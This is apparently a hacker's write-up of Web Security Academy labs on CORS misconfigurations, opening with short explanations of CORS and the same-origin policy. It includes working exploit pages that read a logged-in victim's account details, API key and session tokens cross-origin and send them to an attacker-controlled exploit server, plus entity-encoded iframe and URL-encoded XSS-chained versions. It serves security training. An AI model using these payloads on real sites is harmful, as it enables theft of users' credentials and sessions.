- [What is CORS?](#what-is-cors)
- [What is SOP?](#what-is-sop)
- [Difference between CORS and SOP](#difference-between-cors-and-sop)
- [CORS vulnerability with basic origin reflection](#cors-vulnerability-with-basic-origin-reflection)
- [CORS vulnerability with trusted null origin](#cors-vulnerability-with-trusted-null-origin)
- [CORS vulnerability with trusted insecure protocols](#cors-vulnerability-with-trusted-insecure-protocols)

---

# What is CORS?

CORS or **Cross-Origin Resource Sharing** is a security mechanism implemented by web browsers to control how web page can request resources from different domains that the one serving the page.

# What is SOP?

SOP or **Same-Origin Policy** is a security mechanism implemented by browsers to prevent a script on one origin from accessing data on another origin.

If the script is from `https://example.com` the SOP will block the request:

```js
fetch('https://evil.com/data') 
```

# Difference between CORS and SOP


- SOP: **By default, browsers block** access to resources from other origins for security reasons.
- CORS: Is a **guest list** that the owner (server) provides to the (browser), saying who can come in.

---

# CORS vulnerability with basic origin reflection

Okeeey okey okeey, let's goo.

Open the lab and set the Burpsuite proxy in foxyproxy, then use the credentials given to login and see the **business logic**.

In accountDetails you see something like this:

```http
HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 162

{
  "username": "wiener",
  "email": "test@test.com",
  "apikey": "svhWanCJZsLVjIm5quc95GdzhScHmIzW",
  "sessions": [
    "QyZ8jdQn1tTmWlqkMEOEvB3QAlqCHbon"
  ]
}
```

The session is your actually session and it is in an array, we can think that "sessions" can save more than one sessions values.

If you try to close the session and open again you see that only one session value is saved in the response, but **if you delete the value of the cookie in storage tool and log in again** in the response of /accountDetails you will see two session. If you also look at the API key, you will see that it is still the same.

You can do a CSRF token attack because the endpoint `/accountdetails` it's not linked to any csrf_token but we're not going to do this.

In place of that we are going to take advange of `Access-Control-Allow-Credential: true` used in side server.

This headers allow us to add the **Origin** header and will be accepted

In the request:

```http
Origin: test.com
```

In the response:

```http
Access-Control-Allow-Origin: test.com
```

```html
<h1>Hello</h1>
<script>
	const request = new XMLHttpRequest()
	request.open("get", "https://0a6200b20417331e806d038f001e0054.web-security-academy.net/accountDetails", true)
	
	request.onload = () => {
		window.location.href = "/sergiky?key=" +  request.responseText
	}

	request.withCredentials = true

	request.send()
</script>
```

If you send this to the victim and see the logs of the attacker server you see that obtain the response in key parameter. In the response you have username, mail, apikey, sessions...

# CORS vulnerability with trusted null origin

The same thing, you see that have the header `Access-Control-Allow-Credential: true`, if you try to indicate the origin this doesn't reflected in the response, but if you try to add **Origin: null** it's reflected. This is a misconfiguration of the developers that we are going to take adavantage.

First of all recreate the same piece of code seen above.

```html
<h1>Hello</h1>
<script>
	const request = new XMLHttpRequest()
	request.open("get", "https://0a65003303b009ce82f9151e008700e9.web-security-academy.net/accountDetails", true)
	
	request.onload = () => {
		window.location.href = "/sergiky?key=" +  request.responseText
	}

	request.withCredentials = true

	request.send()
</script>
```

But we can't use it because we are not allowed in the CORS, in this case we have to create a `<iframe>` tag:

```html
<iframe sandbox="allow-scripts allow-top-navigation" srcdoc="&#x3c;&#x68;&#x31;&#x3e;&#x48;&#x65;&#x6c;&#x6c;&#x6f;&#x3c;&#x2f;&#x68;&#x31;&#x3e;&#x0a;&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x0a;&#x09;&#x63;&#x6f;&#x6e;&#x73;&#x74;&#x20;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x20;&#x3d;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x58;&#x4d;&#x4c;&#x48;&#x74;&#x74;&#x70;&#x52;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x28;&#x29;&#x0a;&#x09;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x6f;&#x70;&#x65;&#x6e;&#x28;&#x22;&#x67;&#x65;&#x74;&#x22;&#x2c;&#x20;&#x22;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x30;&#x61;&#x36;&#x35;&#x30;&#x30;&#x33;&#x33;&#x30;&#x33;&#x62;&#x30;&#x30;&#x39;&#x63;&#x65;&#x38;&#x32;&#x66;&#x39;&#x31;&#x35;&#x31;&#x65;&#x30;&#x30;&#x38;&#x37;&#x30;&#x30;&#x65;&#x39;&#x2e;&#x77;&#x65;&#x62;&#x2d;&#x73;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x2d;&#x61;&#x63;&#x61;&#x64;&#x65;&#x6d;&#x79;&#x2e;&#x6e;&#x65;&#x74;&#x2f;&#x61;&#x63;&#x63;&#x6f;&#x75;&#x6e;&#x74;&#x44;&#x65;&#x74;&#x61;&#x69;&#x6c;&#x73;&#x22;&#x2c;&#x20;&#x74;&#x72;&#x75;&#x65;&#x29;&#x0a;&#x09;&#x0a;&#x09;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x6f;&#x6e;&#x6c;&#x6f;&#x61;&#x64;&#x20;&#x3d;&#x20;&#x28;&#x29;&#x20;&#x3d;&#x3e;&#x20;&#x7b;&#x0a;&#x09;&#x09;&#x77;&#x69;&#x6e;&#x64;&#x6f;&#x77;&#x2e;&#x6c;&#x6f;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x2e;&#x68;&#x72;&#x65;&#x66;&#x20;&#x3d;&#x20;&#x22;&#x2f;&#x73;&#x65;&#x72;&#x67;&#x69;&#x6b;&#x79;&#x3f;&#x6b;&#x65;&#x79;&#x3d;&#x22;&#x20;&#x2b;&#x20;&#x20;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x72;&#x65;&#x73;&#x70;&#x6f;&#x6e;&#x73;&#x65;&#x54;&#x65;&#x78;&#x74;&#x0a;&#x09;&#x7d;&#x0a;&#x0a;&#x09;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x77;&#x69;&#x74;&#x68;&#x43;&#x72;&#x65;&#x64;&#x65;&#x6e;&#x74;&#x69;&#x61;&#x6c;&#x73;&#x20;&#x3d;&#x20;&#x74;&#x72;&#x75;&#x65;&#x0a;&#x0a;&#x09;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x73;&#x65;&#x6e;&#x64;&#x28;&#x29;&#x0a;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;">
```

What is a sandbox in iframe?
This enables an extra set of restrictions for the content in the iframe, all is prohibited except:

- `allow-scripts`: Allow to execute javascript code.
- `allow-top-navigation`: This is necessary to use window.location.href.

We build the sandbox without allow-same-origin and automatically established the origin to null.

# CORS vulnerability with trusted insecure protocols

In this lab we are going to chain two vulnerabilites, RXSS and CORS abuse.

If we take a look at the page, when we click in a product, at the bottom we can check the stock of the product, if you inspect the http request and send to intruder, you will see this:

`/?productId=2&storeId=1`

And with this parameters? what happens if we try to do a XSS, first of all try a HTML injection.

`/?productId=<h1>test</h1>&storeId=<h1>hacking</h1>`

And the response return:

```http
<h4>ERROR</h4>Invalid product ID: <h1>test</h1>
```

We see that productId is reflected and interpreted in render mode.

The next step is to login into the account and inspect the request.

You see in the response the header:

You can try to **do this steps** and see if it is reflected in the header `Access-Control-Allow-Origin`:

1. `Origin: test.com`
2. `Origin: http://test.com`
3. `Origin: null`
4. `Origin: subdomain.victim.com`
5. `Origin: http://subdomain.victim.com`
6. `Origin: http://invented-subdomain.victim.com`

We have to build the script.

First of all we build the same script that we see before:

```html
<script>
	const request = new XMLHttpRequest()
	
	request.open("get", "https://0a8f00fd03219b828b790d0d00ff0023.web-security-academy.net/accountDetails", true)
	
	request.onload = () => {
		window.location = "https://exploit-0a3d003803329bbf8bdb0cc201720075.exploit-server.net/exploit?key=" + request.responseText
	}
	
	request.withCredentials = true
	request.send()

</script>
```

Well, the problem now is that we can't abuse CORS because we have to be in some subdomain, we can solve this using the XSS as seen above in stock.0a8f00fd03219b828b790d0d00ff0023.web-security-academy.net.

We have to url-encode the previous script and set in productId parameter:

```html
<h1>Realistic webpage</h1>

<script>
	window.location = "http://stock.0a8f00fd03219b828b790d0d00ff0023.web-security-academy.net/?productId=%3c%73%63%72%69%70%74%3e%0a%09%63%6f%6e%73%74%20%72%65%71%75%65%73%74%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%0a%09%0a%09%72%65%71%75%65%73%74%2e%6f%70%65%6e%28%22%67%65%74%22%2c%20%22%68%74%74%70%73%3a%2f%2f%30%61%38%66%30%30%66%64%30%33%32%31%39%62%38%32%38%62%37%39%30%64%30%64%30%30%66%66%30%30%32%33%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%22%2c%20%74%72%75%65%29%0a%09%0a%09%72%65%71%75%65%73%74%2e%6f%6e%6c%6f%61%64%20%3d%20%28%29%20%3d%3e%20%7b%0a%09%09%77%69%6e%64%6f%77%2e%6c%6f%63%61%74%69%6f%6e%20%3d%20%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%33%64%30%30%33%38%30%33%33%32%39%62%62%66%38%62%64%62%30%63%63%32%30%31%37%32%30%30%37%35%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6b%65%79%3d%22%20%2b%20%72%65%71%75%65%73%74%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%0a%09%7d%0a%09%0a%09%72%65%71%75%65%73%74%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%20%3d%20%74%72%75%65%0a%09%72%65%71%75%65%73%74%2e%73%65%6e%64%28%29%0a%0a%3c%2f%73%63%72%69%70%74%3e&storeId=1"
</script>
```

Send to the victim and see the log.
